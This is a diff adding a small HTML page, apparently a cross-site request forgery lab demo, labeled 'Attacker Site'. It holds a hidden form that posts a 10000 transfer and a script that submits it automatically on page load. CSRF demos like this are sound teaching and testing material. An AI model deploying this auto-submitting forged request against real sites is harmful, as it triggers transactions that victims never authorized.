@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Attacker Site</title>
+</head>
+
+<body style="background:black;color:red;text-align:center;margin-top:100px;">
+
+    <h1>⚠ Evil Website ⚠</h1>
+
+    <p>Performing hidden transaction...</p>
+
+    <form id="attack-form"
+          action="/transfer"
+          method="POST">
+
+        <input type="hidden"
+               name="amount"
+               value="10000">
+
+    </form>
+
+    <script>
+        document.getElementById("attack-form").submit();
+    </script>
+
+</body>
+
+</html>
